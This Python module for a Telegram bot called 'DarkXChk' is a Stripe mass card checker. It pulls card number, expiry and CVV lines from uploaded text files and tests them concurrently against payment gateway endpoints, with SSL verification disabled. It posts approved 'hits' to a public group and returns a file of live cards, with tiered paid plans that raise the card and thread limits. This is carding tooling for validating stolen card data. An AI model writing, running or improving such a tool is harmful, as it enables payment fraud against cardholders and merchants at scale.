# gates/stripe/mstripe.py
import asyncio
import aiohttp
import re
import time
import html
import logging
import io
import itertools
import json
from telegram import Update, InputFile, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.ext import ContextTypes, CallbackQueryHandler
from db import get_user, update_user
from bin import get_bin_info

# =========== CONFIGURATION ===========
SITES = [

]

API_BASE_TEMPLATE = "="
TIMEOUT_SECONDS = 30

def escape_html(text): return html.escape(str(text))

# =========== GLOBAL TRACKERS ===========
TASKS = {}
CHKTXT_COOLDOWNS = {}

# =========== GROUP IDs ===========
PUBLIC_GROUP_ID  = -1003814496328

# =========== HIT DETECTOR ===========
async def send_hit(
    update: Update, context: ContextTypes.DEFAULT_TYPE,
    card: str, status: str, response: str, gateway: str
):
    user         = update.effective_user
    user_mention = f'<a href="tg://user?id={user.id}">{escape_html(user.first_name or "User")}</a>'

    # — PUBLIC GROUP: Hit Detected —
    bot_link    = '<a href="https://t.me/chncexbot">DarkXChk</a>'
    hit_message = (
        f'<tg-emoji emoji-id="5219804923130038865">💎</tg-emoji> 𝑯𝑰𝑻 𝑫𝒆𝒕𝒆𝒄𝒕𝒆𝒅 '
        f'<tg-emoji emoji-id="4916036072560919511">💎</tg-emoji>\n'
        f'━━━━━━━━\n'
        f'𝘜𝘴𝘦𝘳 <tg-emoji emoji-id="5125545114130712471">💎</tg-emoji> {user_mention}\n'
        f'𝘚𝘵𝘢𝘵𝘶𝘴 <tg-emoji emoji-id="5125545114130712471">💎</tg-emoji> {status}\n'
        f'𝘙𝘦𝘴𝘱𝘰𝘯𝘴𝘦 <tg-emoji emoji-id="5125545114130712471">💎</tg-emoji> {escape_html(response)}\n'
        f'𝘎𝘢𝘵𝘦𝘸𝘢𝘺 <tg-emoji emoji-id="5125545114130712471">💎</tg-emoji> {gateway}\n'
        f'━━━━━━━━\n'
        f'𝑯𝑰𝑻 𝑭𝒓𝒐𝒎 <tg-emoji emoji-id="5125546965261618614">💎</tg-emoji> {bot_link}'
    )
    try:
        await context.bot.send_message(
            chat_id=PUBLIC_GROUP_ID, text=hit_message, parse_mode=ParseMode.HTML
        )
    except Exception as e:
        logging.error(f"❌ Failed to send Hit to public group: {e}")


# =========== CC LIMITS ===========
def get_user_cc_limit(user_data, user_id, owner_id=7742548417, admin_ids=None):
    if admin_ids is None:
        admin_ids = {7742548417}
    if user_id == owner_id or user_id in admin_ids:
        return float('inf')
    plan = user_data.get('plan', 'Free').strip().lower()
    return {'diamond': 5000, 'platinum': 3000, 'gold': 1500, 'silver': 500}.get(plan, 200)


# =========== THREAD LIMITS ===========
def get_user_thread_limit(user_data, user_id, owner_id=7742548417, admin_ids=None):
    if admin_ids is None:
        admin_ids = {7742548417}
    if user_id == owner_id or user_id in admin_ids:
        return 12
    plan = user_data.get('plan', 'Free').strip().lower()
    return {'diamond': 10, 'platinum': 8, 'gold': 7, 'silver': 5}.get(plan, 3)


# =========== SINGLE CARD CHECK ===========
# FIX: Accept shared session instead of creating new one per card.
async def chk_single(session: aiohttp.ClientSession, card: str, site: str):
    start   = time.time()
    api_url = API_BASE_TEMPLATE.format(site=site) + card
    try:
        async with session.get(api_url, timeout=aiohttp.ClientTimeout(total=TIMEOUT_SECONDS)) as r:
            txt = await r.text()
            try:
                data     = json.loads(txt)
                status   = data.get("status", "").lower()
                response = data.get("response", "")

                if "requires_action" in str(response).lower():
                    return "APPROVED_HIDDEN", response[:60], round(time.time() - start, 2)
                if status in ["approved", "success", "thank"] or "approved" in str(response).lower():
                    return "APPROVED", response[:60], round(time.time() - start, 2)
                return "DECLINED", response[:60], round(time.time() - start, 2)

            except json.JSONDecodeError:
                tl = txt.lower()
                if "approved" in tl or "success" in tl or "thank" in tl:
                    return "APPROVED", txt[:60], round(time.time() - start, 2)
                return "DECLINED", txt[:60], round(time.time() - start, 2)

    except asyncio.TimeoutError:
        return "ERROR", "Timeout", round(time.time() - start, 2)
    except Exception as e:
        return "ERROR", str(e)[:60], round(time.time() - start, 2)


# =========== BUILD INLINE BUTTONS ===========
def build_buttons(user_id, live=0, dead=0):
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton(f"✅ 𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙: {live}", callback_data="noop"),
            InlineKeyboardButton(f"❌ 𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙: {dead}", callback_data="noop"),
        ],
        [InlineKeyboardButton("🛑 𝙎𝙏𝙊𝙋", callback_data=f"stopchk_{user_id}")]
    ])


# =========== EXTRACT CARDS ===========
def extract_cards(text: str) -> list[str]:
    return re.findall(r'\b\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}\b', text)


# =========== SHOW APPROVED CARD ===========
async def show_approved_card(
    card: str, response: str, took: float,
    msg, update: Update, context: ContextTypes.DEFAULT_TYPE
):
    bin_info = await get_bin_info(card[:6])
    txt = (
        f"𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅\n\n"
        f"𝗖𝗖 ⇾ <code>{escape_html(card)}</code>\n"
        f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth\n"
        f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ <code>{escape_html(response)}</code>\n\n"
        f"<pre>"
        f"𝗕𝗜𝗡 𝗜𝗻𝗳𝗼 ➜ {escape_html(bin_info.get('scheme', 'N/A'))}\n"
        f"𝗕𝗮𝗻𝗸 ➜ {escape_html(bin_info.get('bank', 'N/A'))}\n"
        f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➜ {escape_html(bin_info.get('country', 'Unknown'))} {bin_info.get('country_emoji', '')}"
        f"</pre>\n\n"
        f"⏱️ 𝗧𝗶𝗺𝗲: {took}s"
    )
    await msg.reply_text(txt, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
    await send_hit(update, context, card, "APPROVED", response, "Stripe Mass Auth")


# =========== UPDATE PROGRESS BOARD ===========
# FIX: Only edit every 3 checks to avoid Telegram rate limits.
async def update_progress_board(
    user_id: int, board_msg, live: int, dead: int, checked: int, total: int
):
    if user_id not in TASKS:
        return
    elapsed      = time.time() - TASKS[user_id].get('start_time', time.time())
    progress_pct = (checked / total * 100) if total > 0 else 0
    board_text   = (
        f"<b><i>Checking Your Ccs</i></b>\n\n"
        f"📊 <b>Progress:</b> {checked}/{total} ({progress_pct:.0f}%)\n"
        f"✅ <b>Approved:</b> {live}\n"
        f"❌ <b>Declined:</b> {dead}\n"
        f"⏱️ <b>Elapsed:</b> {elapsed:.0f}s"
    )
    try:
        await board_msg.edit_text(
            board_text,
            parse_mode=ParseMode.HTML,
            reply_markup=build_buttons(user_id, live, dead)
        )
    except Exception:
        pass


# =========== MAIN PROCESSING ===========
async def process_txt_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg  = update.message
    uid  = msg.from_user.id
    OWNER_ID  = 7742548417
    ADMIN_IDS = {7742548417}

    user_data = await get_user(uid)
    if not user_data:
        await msg.reply_text("❌ User data not found.")
        return

    user_plan  = user_data.get('plan', 'Free')
    cc_limit   = get_user_cc_limit(user_data, uid, OWNER_ID, ADMIN_IDS)
    max_threads = get_user_thread_limit(user_data, uid, OWNER_ID, ADMIN_IDS)
    is_free    = user_plan.lower() == 'free'

    # — Cooldown for free users —
    if is_free:
        now      = time.time()
        last     = CHKTXT_COOLDOWNS.get(uid, 0)
        cooldown = 120
        if now - last < cooldown:
            remaining = int(cooldown - (now - last))
            await msg.reply_text(
                f"⏳ 𝙁𝙧𝙚𝙚 𝙐𝙨𝙚𝙧 𝘾𝙤𝙤𝙡𝙙𝙤𝙬𝙣\n\n"
                f"⚠️ 𝙋𝙡𝙚𝙖𝙨𝙚 𝙬𝙖𝙞𝙩 {remaining // 60}𝙢 {remaining % 60}𝙨\n"
                f"💡 𝙐𝙥𝙜𝙧𝙖𝙙𝙚 𝙛𝙤𝙧 𝙣𝙤 𝙘𝙤𝙤𝙡𝙙𝙤𝙬𝙣"
            )
            return
        CHKTXT_COOLDOWNS[uid] = now

    # — Validate reply —
    if not msg.reply_to_message or not msg.reply_to_message.document:
        await msg.reply_text(
            "❌ Reply to a .txt file.\nUsage: <code>/chktxt</code>",
            parse_mode=ParseMode.HTML
        )
        return

    doc = msg.reply_to_message.document
    if not doc.file_name.lower().endswith(".txt"):
        await msg.reply_text("❌ Only .txt files accepted.")
        return

    # — Read file —
    file_io = io.BytesIO()
    await (await doc.get_file()).download_to_memory(file_io)
    file_io.seek(0)
    cards = extract_cards(file_io.read().decode("utf-8", errors="ignore"))

    if not cards:
        await msg.reply_text("❌ No valid cards found in the file.")
        return

    total_cards = len(cards)

    if total_cards <= cc_limit:
        cards_to_process = total_cards
        limit_message = (
            f"📋 𝘾𝙖𝙧𝙙𝙨 𝙁𝙤𝙪𝙣𝙙: {total_cards}\n"
            f"🔥 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜: All {total_cards} CCs\n"
            f"⚡ 𝙈𝙤𝙙𝙚: Multi-threaded ({max_threads} threads)"
        )
    else:
        cards_to_process = int(cc_limit)
        limit_message = (
            f"📋 𝘾𝙖𝙧𝙙𝙨 𝙁𝙤𝙪𝙣𝙙: {total_cards}\n"
            f"⚠️ 𝙇𝙞𝙢𝙞𝙩 𝙀𝙭𝙘𝙚𝙚𝙙𝙚𝙙!\n"
            f"🔥 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜: First {cards_to_process} CCs only\n"
            f"⚡ 𝙈𝙤𝙙𝙚: Multi-threaded ({max_threads} threads)"
        )

    await msg.reply_text(limit_message, parse_mode=ParseMode.HTML)
    cards = cards[:cards_to_process]

    # — Init task tracker —
    TASKS[uid] = {
        "stop":       False,
        "live":       0,
        "dead":       0,
        "total":      cards_to_process,
        "checked":    0,
        "start_time": time.time(),
        "live_cards": [],
        "board_msg":  None,
    }

    # — Initial progress board —
    board_msg = await msg.reply_text(
        f"<b><i>Checking Your Ccs</i></b>\n\n"
        f"📊 <b>Progress:</b> 0/{cards_to_process} (0%)\n"
        f"✅ <b>Approved:</b> 0\n"
        f"❌ <b>Declined:</b> 0\n"
        f"⏱️ <b>Elapsed:</b> 0s",
        parse_mode=ParseMode.HTML,
        reply_markup=build_buttons(uid, 0, 0)
    )
    TASKS[uid]["board_msg"] = board_msg

    # ─────────────────────────────────────────────────────────────
    #  FIXED THREAD SYSTEM
    #
    #  Problems in original code:
    #  1. asyncio.wait() returns a SET — set has no .append() → crash
    #  2. New ClientSession created per card → slow + connection errors
    #  3. site_index shared across coroutines without lock → race cond
    #  4. progress board never updated inside check_one
    #
    #  Fix:
    #  • ONE shared aiohttp.ClientSession for all cards
    #  • asyncio.Semaphore controls concurrency (correct pattern)
    #  • asyncio.gather(*all_tasks) — no manual pending list needed
    #  • itertools.cycle for round-robin site selection (thread-safe)
    #  • Progress board updated every 3 checks to avoid rate limit
    # ─────────────────────────────────────────────────────────────

    semaphore  = asyncio.Semaphore(max_threads)
    site_cycle = itertools.cycle(SITES)   # thread-safe round-robin
    board_lock = asyncio.Lock()           # prevent concurrent board edits

    async def check_one(card: str, session: aiohttp.ClientSession):
        # Early stop check
        if uid not in TASKS or TASKS[uid].get("stop"):
            return

        async with semaphore:
            # Double-check after acquiring semaphore
            if uid not in TASKS or TASKS[uid].get("stop"):
                return

            site              = next(site_cycle)
            status, response, took = await chk_single(session, card, site)

            # Check stop after API call returns
            if uid not in TASKS or TASKS[uid].get("stop"):
                return

            task = TASKS[uid]
            task["checked"] += 1

            if status == "APPROVED":
                task["live"] += 1
                task["live_cards"].append(card)
                await show_approved_card(card, response, took, msg, update, context)

            elif status == "APPROVED_HIDDEN":
                task["live"] += 1
                task["live_cards"].append(card)
                await send_hit(
                    update, context, card, "APPROVED_HIDDEN", response, "Stripe Mass Auth"
                )
            else:
                # DECLINED or ERROR both count as dead
                task["dead"] += 1

            # FIX: Update progress board every 3 checks (avoid rate limit)
            if task["checked"] % 3 == 0 or task["checked"] == task["total"]:
                async with board_lock:
                    await update_progress_board(
                        uid, board_msg,
                        task["live"], task["dead"],
                        task["checked"], task["total"]
                    )

    # — Create shared session + run all tasks concurrently —
    connector = aiohttp.TCPConnector(
        limit=max_threads + 4,  # pool size slightly above thread count
        ssl=False               # skip SSL verification for speed
    )
    async with aiohttp.ClientSession(connector=connector) as session:
        all_tasks = [
            asyncio.create_task(check_one(card, session))
            for card in cards
        ]
        await asyncio.gather(*all_tasks, return_exceptions=True)

    # — Final summary —
    if uid not in TASKS:
        return

    task         = TASKS[uid]
    stopped      = task["stop"]
    total_time   = time.time() - task["start_time"]
    live         = task["live"]
    dead         = task["dead"]
    checked      = task["checked"]
    success_rate = (live / checked * 100) if checked > 0 else 0

    if stopped:
        final_text = (
            f"🛑 𝙈𝙖𝙨𝙨 𝘾𝙝𝙚𝙘𝙠 𝙎𝙩𝙤𝙥𝙥𝙚𝙙\n\n"
            f"📊 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙚𝙙: {checked}/{cards_to_process}\n"
            f"✅ 𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙: {live}\n"
            f"❌ 𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙: {dead}\n"
            f"⏱️ 𝙏𝙞𝙢𝙚: {total_time:.1f}s"
        )
        reply_markup = InlineKeyboardMarkup([
            [InlineKeyboardButton("⏹️ 𝙎𝙩𝙤𝙥𝙥𝙚𝙙", callback_data="noop")]
        ])
    else:
        final_text = (
            f"✅ 𝙈𝙖𝙨𝙨 𝘾𝙝𝙚𝙘𝙠 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚𝙙\n\n"
            f"📊 𝙏𝙤𝙩𝙖𝙡 𝘾𝘾𝙨: {cards_to_process}\n"
            f"✅ 𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙: {live}\n"
            f"❌ 𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙: {dead}\n"
            f"📈 𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙍𝙖𝙩𝙚: {success_rate:.1f}%\n"
            f"⏱️ 𝙏𝙤𝙩𝙖𝙡 𝙏𝙞𝙢𝙚: {total_time:.1f}s"
        )
        reply_markup = InlineKeyboardMarkup([
            [InlineKeyboardButton("✅ 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚𝙙", callback_data="noop")]
        ])

    try:
        await board_msg.edit_text(
            final_text, parse_mode=ParseMode.HTML, reply_markup=reply_markup
        )
    except Exception:
        pass

    # — Send live cards file if any hits —
    if live > 0:
        live_cards = task["live_cards"]
        out        = io.BytesIO("\n".join(live_cards).encode())
        out.name   = f"Live_x{live}_{int(time.time())}.txt"
        await msg.reply_document(
            document=InputFile(out),
            caption=(
                f"✅ 𝙇𝙞𝙫𝙚 𝘾𝙖𝙧𝙙𝙨 𝙀𝙭𝙥𝙤𝙧𝙩\n"
                f"📊 𝙇𝙞𝙫𝙚: {live}/{cards_to_process} CCs\n"
                f"📈 𝙎𝙪𝙘𝙘𝙚𝙨𝙨: {success_rate:.1f}%"
            ),
            parse_mode=ParseMode.HTML
        )

    if uid in TASKS:
        del TASKS[uid]


# =========== STOP CALLBACK ===========
async def stopchk_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    if not query.data.startswith("stopchk_"):
        return

    try:
        target_uid = int(query.data.split("_")[1])
    except (ValueError, IndexError):
        await query.answer("❌ Invalid stop request!", show_alert=True)
        return

    if query.from_user.id != target_uid:
        await query.answer("❌ Not your task!", show_alert=True)
        return

    if target_uid in TASKS:
        TASKS[target_uid]["stop"] = True
        await query.answer("⏹ Stopping...", show_alert=True)
    else:
        await query.answer("Task already finished.", show_alert=True)


# =========== COMMAND ENTRY ===========
async def chktxt_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    asyncio.create_task(process_txt_file(update, context))


# =========== NOOP HANDLER ===========
async def noop_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.callback_query.answer()


# =========== REGISTER CALLBACKS ===========
def register_mstripe_callbacks(app):
    app.add_handler(CallbackQueryHandler(stopchk_callback, pattern="^stopchk_"))
    app.add_handler(CallbackQueryHandler(noop_handler,     pattern="^noop"))
